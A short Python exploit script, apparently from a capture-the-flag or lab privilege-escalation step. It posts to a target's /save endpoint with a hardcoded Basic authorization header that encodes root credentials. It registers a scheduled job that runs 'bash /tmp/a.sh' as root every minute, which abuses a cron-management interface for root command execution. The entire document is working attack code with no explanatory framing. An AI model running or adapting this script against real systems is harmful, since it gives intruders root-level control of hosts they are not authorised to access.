import requests
import sys

if len(sys.argv) < 2:
    print("Usage: python3 root.py <url>")
    sys.exit(1)

base_url = sys.argv[1].rstrip('/')
target_url = f"{base_url}/save"

headers = {
    "Authorization": "Basic cm9vdDpQNHNzdzByZFMwcFJpMFQzYw==",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest"
}

payload = {
    "name": "root",
    "command": "bash /tmp/a.sh",
    "schedule": "* * * * *",
    "_id": "-1",
    "logging": "false"
}

try:
    res = requests.post(target_url, headers=headers, data=payload)
    print(f"[*] Status Code: {res.status_code}")
    print("[*] Response Body:")
    print(res.text)
except Exception as e:
    print(f"[!] Error: {e}")
